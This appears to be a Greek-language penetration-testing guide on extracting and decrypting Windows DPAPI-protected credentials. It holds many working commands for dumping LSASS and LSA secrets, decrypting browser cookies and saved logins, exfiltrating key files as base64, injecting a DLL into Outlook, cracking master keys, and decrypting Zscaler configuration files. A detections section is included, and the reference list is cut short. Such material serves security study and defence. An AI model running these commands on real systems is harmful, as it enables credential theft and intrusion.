# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## Τι είναι το DPAPI

Το Data Protection API (DPAPI) χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για τη **συμμετρική κρυπτογράφηση ασύμμετρων ιδιωτικών κλειδιών**, αξιοποιώντας μυστικά χρήστη ή συστήματος ως σημαντική πηγή εντροπίας. Αυτή η προσέγγιση απλοποιεί την κρυπτογράφηση για τους developers, επιτρέποντάς τους να κρυπτογραφούν δεδομένα χρησιμοποιώντας ένα κλειδί που προέρχεται από τα μυστικά σύνδεσης του χρήστη ή, για κρυπτογράφηση συστήματος, από τα μυστικά αυθεντικοποίησης του domain του συστήματος, εξαλείφοντας έτσι την ανάγκη οι developers να διαχειρίζονται οι ίδιοι την προστασία του κλειδιού κρυπτογράφησης.

Ο πιο συνηθισμένος τρόπος χρήσης του DPAPI είναι μέσω των συναρτήσεων **`CryptProtectData` και `CryptUnprotectData`**, οι οποίες επιτρέπουν στις εφαρμογές να κρυπτογραφούν και να αποκρυπτογραφούν δεδομένα με ασφάλεια, χρησιμοποιώντας το session της διεργασίας που είναι συνδεδεμένη εκείνη τη στιγμή. Αυτό σημαίνει ότι τα κρυπτογραφημένα δεδομένα μπορούν να αποκρυπτογραφηθούν μόνο από τον ίδιο χρήστη ή το ίδιο σύστημα που τα κρυπτογράφησε.

Επιπλέον, αυτές οι συναρτήσεις δέχονται και μια παράμετρο **`entropy`**, η οποία θα χρησιμοποιηθεί επίσης κατά την κρυπτογράφηση και την αποκρυπτογράφηση. Επομένως, για να αποκρυπτογραφήσετε κάτι που κρυπτογραφήθηκε χρησιμοποιώντας αυτήν την παράμετρο, πρέπει να παρέχετε την ίδια τιμή entropy που χρησιμοποιήθηκε κατά την κρυπτογράφηση.

### Δημιουργία key χρηστών

Το DPAPI δημιουργεί ένα μοναδικό key (που ονομάζεται **`pre-key`**) για κάθε χρήστη, με βάση τα credentials του. Αυτό το key προέρχεται από το password του χρήστη και άλλους παράγοντες, ενώ ο αλγόριθμος εξαρτάται από τον τύπο του χρήστη, αλλά τελικά καταλήγει σε ένα SHA1. Για παράδειγμα, για domain users, **εξαρτάται από το NTLM hash του χρήστη**.

Αυτό είναι ιδιαίτερα ενδιαφέρον επειδή, αν ένας attacker μπορέσει να αποκτήσει το password hash του χρήστη, μπορεί:

- **Να αποκρυπτογραφήσει οποιαδήποτε δεδομένα κρυπτογραφήθηκαν με το DPAPI** χρησιμοποιώντας το key αυτού του χρήστη, χωρίς να χρειάζεται να επικοινωνήσει με οποιοδήποτε API
- Να προσπαθήσει να **κάνει crack στο password** offline, προσπαθώντας να δημιουργήσει το έγκυρο DPAPI key

Επιπλέον, κάθε φορά που κάποια δεδομένα κρυπτογραφούνται από έναν χρήστη με το DPAPI, δημιουργείται ένα νέο **master key**. Αυτό το master key είναι αυτό που χρησιμοποιείται στην πράξη για την κρυπτογράφηση των δεδομένων. Σε κάθε master key αποδίδεται ένα **GUID** (Globally Unique Identifier) που το ταυτοποιεί.

Τα master keys αποθηκεύονται στον κατάλογο **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, όπου το `{SID}` είναι το Security Identifier αυτού του χρήστη. Το master key αποθηκεύεται κρυπτογραφημένο με το **`pre-key`** του χρήστη και επίσης με ένα **domain backup key** για ανάκτηση (επομένως το ίδιο key αποθηκεύεται κρυπτογραφημένο 2 φορές, με 2 διαφορετικά passwords).

Σημειώστε ότι το **domain key που χρησιμοποιείται για την κρυπτογράφηση του master key βρίσκεται στους domain controllers και δεν αλλάζει ποτέ**, επομένως, αν ένας attacker έχει πρόσβαση στον domain controller, μπορεί να ανακτήσει το domain backup key και να αποκρυπτογραφήσει τα master keys όλων των χρηστών στο domain.<sup>[[2]](#references)</sup>

Τα κρυπτογραφημένα blobs περιέχουν το **GUID του master key** που χρησιμοποιήθηκε για την κρυπτογράφηση των δεδομένων, μέσα στις headers τους.

> [!TIP]
> Τα DPAPI encrypted blobs ξεκινούν με **`01 00 00 00`**

Εύρεση master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Έτσι θα μοιάζει ένα σύνολο από Master Keys ενός user:

![Τι είναι το DPAPI - Δημιουργία κλειδιών user: Έτσι θα μοιάζει ένα σύνολο από Master Keys ενός user](<../../images/image (1121).png>)

### Δημιουργία Machine/System key

Αυτό είναι το key που χρησιμοποιείται από το machine για την κρυπτογράφηση δεδομένων. Βασίζεται στο **DPAPI_SYSTEM LSA secret**, το οποίο είναι ένα ειδικό key στο οποίο μπορεί να έχει πρόσβαση μόνο ο SYSTEM user. Αυτό το key χρησιμοποιείται για την κρυπτογράφηση δεδομένων που πρέπει να είναι προσβάσιμα από το ίδιο το system, όπως credentials σε επίπεδο machine ή secrets σε όλο το system.<sup>[[2]](#references)</sup>

Σημειώστε ότι αυτά τα keys **δεν διαθέτουν domain backup**, επομένως είναι προσβάσιμα μόνο locally:

- Το **Mimikatz** μπορεί να αποκτήσει πρόσβαση σε αυτά κάνοντας dump των LSA secrets με την εντολή: `mimikatz lsadump::secrets`
- Το secret αποθηκεύεται μέσα στο registry, επομένως ένας administrator θα μπορούσε να **τροποποιήσει τα DACL permissions για να αποκτήσει πρόσβαση σε αυτό**. Το registry path είναι: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Είναι επίσης δυνατή η offline extraction από registry hives. Για παράδειγμα, ως administrator στο target, αποθηκεύστε τα hives και κάντε exfiltration:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Στη συνέχεια, στο analysis box σας, ανακτήστε το DPAPI_SYSTEM LSA secret από τα hives και χρησιμοποιήστε το για να αποκρυπτογραφήσετε blobs machine-scope (κωδικούς πρόσβασης scheduled tasks, διαπιστευτήρια services, Wi‑Fi profiles κ.λπ.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Προστατευμένα δεδομένα από το DPAPI

Στα προσωπικά δεδομένα που προστατεύονται από το DPAPI περιλαμβάνονται:

- Windows creds
- Οι κωδικοί πρόσβασης και τα δεδομένα αυτόματης συμπλήρωσης του Internet Explorer και του Google Chrome
- Οι κωδικοί πρόσβασης λογαριασμών e-mail και εσωτερικών FTP για εφαρμογές όπως το Outlook και το Windows Mail
- Οι κωδικοί πρόσβασης για κοινόχρηστους φακέλους, πόρους, ασύρματα δίκτυα και το Windows Vault, συμπεριλαμβανομένων των κλειδιών κρυπτογράφησης
- Οι κωδικοί πρόσβασης για συνδέσεις απομακρυσμένης επιφάνειας εργασίας, το .NET Passport και τα ιδιωτικά κλειδιά για διάφορους σκοπούς κρυπτογράφησης και authentication
- Οι κωδικοί πρόσβασης δικτύου που διαχειρίζεται το Credential Manager και προσωπικά δεδομένα σε εφαρμογές που χρησιμοποιούν το CryptProtectData, όπως το Skype, το MSN messenger και άλλες
- Κρυπτογραφημένα blobs μέσα στο register
- ...

Τα δεδομένα που προστατεύονται από το σύστημα περιλαμβάνουν:
- Κωδικούς πρόσβασης Wifi
- Κωδικούς πρόσβασης scheduled tasks
- ...

### Επιλογές εξαγωγής master key

- Αν ο χρήστης διαθέτει domain admin privileges, μπορεί να αποκτήσει πρόσβαση στο **domain backup key** για να αποκρυπτογραφήσει όλα τα user master keys στο domain:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Με local admin privileges, είναι δυνατή η **πρόσβαση στη μνήμη του LSASS** για την εξαγωγή των DPAPI master keys όλων των συνδεδεμένων χρηστών και του SYSTEM key.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Εάν ο χρήστης έχει δικαιώματα local admin, μπορεί να αποκτήσει πρόσβαση στο **DPAPI_SYSTEM LSA secret** για να αποκρυπτογραφήσει τα machine master keys:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Αν είναι γνωστός ο κωδικός πρόσβασης ή το NTLM hash του χρήστη, μπορείτε να **αποκρυπτογραφήσετε απευθείας τα master keys του χρήστη**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Αν βρίσκεστε μέσα σε μια session ως ο χρήστης, είναι δυνατό να ζητήσετε από το DC το **backup key για την αποκρυπτογράφηση των master keys χρησιμοποιώντας RPC**. Αν είστε local admin και ο χρήστης είναι logged in, θα μπορούσατε να **κλέψετε το session token του** για αυτό:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Λίστα Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Πρόσβαση σε κρυπτογραφημένα δεδομένα DPAPI

### Εύρεση κρυπτογραφημένων δεδομένων DPAPI

Τα **προστατευμένα αρχεία** των χρηστών βρίσκονται συνήθως στα:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Ελέγξτε επίσης αντικαθιστώντας το `\Roaming\` με `\Local\` στις παραπάνω διαδρομές.

Παραδείγματα Enumeration:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) μπορεί να εντοπίσει DPAPI encrypted blobs στο file system, registry και B64 blobs:<sup>[[12]](#references)</sup>
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Σημειώστε ότι το [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (από το ίδιο repo) μπορεί να χρησιμοποιηθεί για αποκρυπτογράφηση, μέσω DPAPI, ευαίσθητων δεδομένων όπως cookies.<sup>[[12]](#references)</sup>

#### Γρήγορες συνταγές για Chromium/Edge/Electron (SharpChrome)

- Τρέχων χρήστης, interactive αποκρυπτογράφηση αποθηκευμένων logins/cookies (λειτουργεί ακόμη και με app-bound cookies στο Chrome 127+, επειδή το επιπλέον key ανακτάται από το Credential Manager του χρήστη κατά την εκτέλεση σε user context):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Offline ανάλυση όταν έχετε μόνο αρχεία. Αρχικά εξαγάγετε το AES state key από το "Local State" του profile και, στη συνέχεια, χρησιμοποιήστε το για να αποκρυπτογραφήσετε το cookie DB:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Domain-wide/remote triage όταν διαθέτετε το DPAPI domain backup key (PVK) και δικαιώματα admin στο target host:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Αν διαθέτετε το DPAPI prekey/credkey ενός χρήστη (από το LSASS), μπορείτε να παραλείψετε το password cracking και να αποκρυπτογραφήσετε απευθείας τα δεδομένα του προφίλ:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Σημειώσεις
- Οι νεότερες εκδόσεις Chrome/Edge ενδέχεται να αποθηκεύουν ορισμένα cookies χρησιμοποιώντας κρυπτογράφηση "App-Bound". Η offline αποκρυπτογράφηση των συγκεκριμένων cookies δεν είναι δυνατή χωρίς το πρόσθετο app-bound key· εκτελέστε το SharpChrome υπό το context του χρήστη-στόχου για να το ανακτήσει αυτόματα. Δείτε την ανάρτηση του Chrome security blog που αναφέρεται παρακάτω.<sup>[[5]](#references)</sup>

### Πρόσβαση σε κλειδιά και δεδομένα

- **Χρησιμοποιήστε το SharpDPAPI** για να λάβετε credentials από αρχεία κρυπτογραφημένα με DPAPI από την τρέχουσα συνεδρία:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Λάβετε πληροφορίες διαπιστευτηρίων** όπως τα κρυπτογραφημένα δεδομένα και το guidMasterKey.<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Πρόσβαση σε masterkeys**:

Αποκρυπτογραφήστε ένα masterkey ενός χρήστη που ζητά το **domain backup key** μέσω RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Το εργαλείο **SharpDPAPI** υποστηρίζει επίσης αυτά τα arguments για την αποκρυπτογράφηση masterkey (σημειώστε ότι είναι δυνατή η χρήση του `/rpc` για τη λήψη του domain backup key, του `/password` για τη χρήση ενός plaintext password ή του `/pvk` για τον καθορισμό ενός αρχείου ιδιωτικού κλειδιού DPAPI domain...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Αποκρυπτογράφηση δεδομένων με χρήση masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Το εργαλείο **SharpDPAPI** υποστηρίζει επίσης αυτά τα ορίσματα για την αποκρυπτογράφηση των `credentials|vaults|rdg|keepass|triage|blob|ps` (σημειώστε ότι είναι δυνατή η χρήση του `/rpc` για τη λήψη του domain backup key, του `/password` για τη χρήση ενός plaintext password, του `/pvk` για τον καθορισμό ενός αρχείου ιδιωτικού κλειδιού DPAPI του domain και του `/unprotect` για τη χρήση της τρέχουσας συνεδρίας του χρήστη...):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Χρήση ενός DPAPI prekey/credkey απευθείας (δεν απαιτείται password)

Αν μπορείτε να κάνετε dump του LSASS, το Mimikatz συχνά εκθέτει ένα DPAPI key ανά logon, το οποίο μπορεί να χρησιμοποιηθεί για την αποκρυπτογράφηση των masterkeys του χρήστη χωρίς να γνωρίζετε το plaintext password. Περάστε αυτήν την τιμή απευθείας στο tooling:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Αποκρυπτογράφηση ορισμένων δεδομένων με χρήση της **τρέχουσας συνεδρίας χρήστη**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Offline αποκρυπτογράφηση με το Impacket dpapi.py

Αν έχετε το SID και το password του χρήστη-θύματος (ή το NT hash), μπορείτε να αποκρυπτογραφήσετε τα DPAPI masterkeys και τα Credential Manager blobs εξ ολοκλήρου offline χρησιμοποιώντας το Impacket’s dpapi.py.<sup>[[10]](#references)[[11]](#references)</sup>

- Εντοπίστε τα artefacts στον δίσκο:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Αντιστοιχισμένο masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Αν τα εργαλεία μεταφοράς αρχείων είναι flaky, κάντε base64 τα αρχεία στο host και αντιγράψτε την έξοδο:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Αποκρυπτογραφήστε το masterkey με το SID και το password/hash του χρήστη:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Χρησιμοποιήστε το decrypted masterkey για να κάνετε decrypt το credential blob:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Αυτή η διαδικασία συχνά ανακτά domain credentials που έχουν αποθηκευτεί από εφαρμογές μέσω του Windows Credential Manager, συμπεριλαμβανομένων administrative accounts (π.χ. `*_adm`).

---

### Διαχείριση Προαιρετικού Entropy ("Third-party entropy")

Ορισμένες εφαρμογές περνούν μια πρόσθετη τιμή **entropy** στο `CryptProtectData`. Χωρίς αυτή την τιμή, το blob δεν μπορεί να γίνει decrypt, ακόμη και αν είναι γνωστό το σωστό masterkey. Επομένως, η απόκτηση του entropy είναι απαραίτητη όταν στοχεύετε credentials που προστατεύονται με αυτόν τον τρόπο (π.χ. Microsoft Outlook, ορισμένοι VPN clients).

Το [**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) είναι ένα user-mode DLL που κάνει hook στις συναρτήσεις DPAPI μέσα στη target process και καταγράφει αυτόματα κάθε optional entropy που παρέχεται. Η εκτέλεση του EntropyCapture σε **DLL-injection** mode εναντίον processes όπως `outlook.exe` ή `vpnclient.exe` δημιουργεί ένα αρχείο που αντιστοιχίζει κάθε entropy buffer με την calling process και το blob. Το captured entropy μπορεί αργότερα να δοθεί στο **SharpDPAPI** (`/entropy:`) ή στο **Mimikatz** (`/entropy:<file>`) για να γίνει decrypt των δεδομένων.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Η Microsoft εισήγαγε format masterkey **context 3** ξεκινώντας από τα Windows 10 v1607 (2016). Το `hashcat` v6.2.6 (Δεκέμβριος 2023) πρόσθεσε τα hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) και **22102** (context 3), επιτρέποντας GPU-accelerated cracking των user passwords απευθείας από το masterkey file. Έτσι, οι attackers μπορούν να πραγματοποιούν word-list ή brute-force attacks χωρίς να αλληλεπιδρούν με το target system.<sup>[[7]](#references)</sup>

Το `DPAPISnoop` (2024) αυτοματοποιεί τη διαδικασία:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Το εργαλείο μπορεί επίσης να αναλύσει **Credential** και **Vault blobs**, να τα αποκρυπτογραφήσει με cracked keys και να εξαγάγει passwords σε cleartext.<sup>[[8]](#references)</sup>


### Πρόσβαση σε δεδομένα άλλου machine

Στα **SharpDPAPI** και **SharpChrome** μπορείτε να καθορίσετε την επιλογή **`/server:HOST`** για να αποκτήσετε πρόσβαση στα δεδομένα ενός remote machine. Φυσικά, πρέπει να μπορείτε να αποκτήσετε πρόσβαση σε αυτό το machine και στο ακόλουθο παράδειγμα θεωρείται ότι το **domain backup encryption key είναι γνωστό**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Άλλα εργαλεία

### HEKATOMB

Το [**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) είναι ένα εργαλείο που αυτοματοποιεί την εξαγωγή όλων των χρηστών και των υπολογιστών από τον κατάλογο LDAP, καθώς και την εξαγωγή του backup key του domain controller μέσω RPC. Στη συνέχεια, το script επιλύει τη διεύθυνση IP όλων των υπολογιστών και εκτελεί ένα smbclient σε όλους τους υπολογιστές, ώστε να ανακτήσει όλα τα DPAPI blobs όλων των χρηστών και να αποκρυπτογραφήσει τα πάντα με το domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Με τη λίστα υπολογιστών που έχει εξαχθεί από το LDAP, μπορείτε να βρείτε κάθε subnet, ακόμη κι αν δεν το γνωρίζατε!

### DonPAPI 2.x (2024-05)

Το [**DonPAPI**](https://github.com/login-securite/DonPAPI) μπορεί να κάνει αυτόματα dump secrets που προστατεύονται από το DPAPI. Η έκδοση 2.x εισήγαγε:<sup>[[9]](#references)</sup>

* Παράλληλη συλλογή blobs από εκατοντάδες hosts
* Parsing των **context 3** masterkeys και αυτόματη ενσωμάτωση cracking με το Hashcat
* Υποστήριξη για encrypted cookies του Chrome με "App-Bound" (δείτε την επόμενη ενότητα)
* Ένα νέο mode **`--snapshot`** για επαναλαμβανόμενο polling των endpoints και diff των blobs που δημιουργήθηκαν πρόσφατα

### DPAPISnoop

Το [**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) είναι ένας C# parser για αρχεία masterkey/credential/vault, ο οποίος μπορεί να παράγει formats για Hashcat/JtR και, προαιρετικά, να εκτελεί αυτόματα cracking. Υποστηρίζει πλήρως formats machine και user masterkey έως και τα Windows 11 24H1.<sup>[[8]](#references)</sup>


## Συνήθεις detections

- Πρόσβαση σε αρχεία στα `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` και σε άλλους καταλόγους που σχετίζονται με το DPAPI.
- Ιδιαίτερα από ένα network share όπως το **C$** ή το **ADMIN$**.
- Χρήση των **Mimikatz**, **SharpDPAPI** ή παρόμοιων tooling για πρόσβαση στη μνήμη του LSASS ή για dump masterkeys.
- Event **4662**: *Εκτελέστηκε μια ενέργεια σε ένα object* – μπορεί να συσχετιστεί με πρόσβαση στο object **`BCKUPKEY`**.
- Event **4673/4674** όταν μια διεργασία ζητά το *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Ευπάθειες και αλλαγές στο ecosystem 2023-2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (Νοέμβριος 2023). Ένας attacker με network access μπορούσε να εξαπατήσει ένα domain member ώστε να ανακτήσει ένα κακόβουλο DPAPI backup key, επιτρέποντας την αποκρυπτογράφηση user masterkeys. Διορθώθηκε στο cumulative update του Νοεμβρίου 2023 – οι administrators θα πρέπει να διασφαλίσουν ότι τα DCs και τα workstations έχουν εγκαταστήσει πλήρως τα updates.<sup>[[4]](#references)</sup>
* **Chrome 127 “App-Bound” cookie encryption** (Ιούλιος 2024) αντικατέστησε την παλαιότερη προστασία αποκλειστικά μέσω DPAPI με ένα επιπλέον key αποθηκευμένο στο **Credential Manager** του χρήστη. Η offline αποκρυπτογράφηση cookies απαιτεί πλέον τόσο το DPAPI masterkey όσο και το **GCM-wrapped app-bound key**. Τα SharpChrome v2.3 και DonPAPI 2.x μπορούν να ανακτήσουν το επιπλέον key όταν εκτελούνται με user context.<sup>[[5]](#references)</sup>


### Case Study: Zscaler Client Connector – Custom Entropy Derived From SID

Το Zscaler Client Connector αποθηκεύει αρκετά configuration files κάτω από το `C:\ProgramData\Zscaler` (π.χ. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Κάθε αρχείο είναι encrypted με **DPAPI (Machine scope)**, όμως ο vendor παρέχει **custom entropy** που *υπολογίζεται κατά το runtime*, αντί να αποθηκεύεται στον δίσκο.<sup>[[1]](#references)</sup>

Το entropy ανακατασκευάζεται από δύο στοιχεία:

1. Ένα hard-coded secret ενσωματωμένο στο `ZSACredentialProvider.dll`.
2. Το **SID** του Windows account στο οποίο ανήκει η configuration.

Ο αλγόριθμος που υλοποιείται από το DLL είναι ισοδύναμος με:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Επειδή το secret είναι ενσωματωμένο σε ένα DLL που μπορεί να διαβαστεί από τον δίσκο, **οποιοσδήποτε local attacker με δικαιώματα SYSTEM μπορεί να αναδημιουργήσει το entropy για οποιοδήποτε SID** και να κάνει decrypt τα blobs offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Η αποκρυπτογράφηση αποδίδει την πλήρη διαμόρφωση JSON, συμπεριλαμβανομένων όλων των **device posture checks** και της αναμενόμενης τιμής τους — πληροφορία ιδιαίτερα πολύτιμη κατά την προσπάθεια για client-side bypasses.

> TIP: τα υπόλοιπα κρυπτογραφημένα artifacts (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) προστατεύονται με DPAPI **χωρίς entropy** (`16` μηδενικά bytes). Επομένως, μπορούν να αποκρυπτογραφηθούν απευθείας με το `ProtectedData.Unprotect` μόλις αποκτηθούν δικαιώματα SYSTEM.

## Αναφορές

- [1] [Synacktiv – Μπορείτε να εμπιστευτείτε το zero trust; Παράκαμψη των Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [Μυστικά DPAPI. Ανάλυση ασφάλειας και ανάκτηση δεδομένων στο DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Ανάγνωση κρυπτογραφημένων μυστικών DPAPI με Mimikatz και C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
